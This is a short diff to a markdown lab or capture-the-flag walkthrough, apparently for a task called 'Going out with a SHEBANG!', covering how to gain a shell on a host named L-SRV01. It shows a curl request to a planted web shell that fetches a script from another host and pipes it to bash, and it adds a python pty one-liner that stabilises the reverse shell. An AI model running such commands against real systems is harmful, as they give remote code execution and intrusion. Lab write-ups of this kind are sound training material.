@@ -67,10 +67,14 @@ Command used: `curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%
 
 - On the Reverse Shell you already have opened, run the following code:
 	`curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.74.165%3A80%2Fshellscript.sh%7Cbash%20%26'`
-
 	![[Task 19 - Going out with a SHEBANG!-20240919140944870.webp]]
+- Stabilize the shell.
+	`python3 -c 'import pty; pty.spawn("/bin/bash")'`
 
 You have shell onto  L-SRV01.
+
+
+---
 
 ## Flag on L-SRV01
 
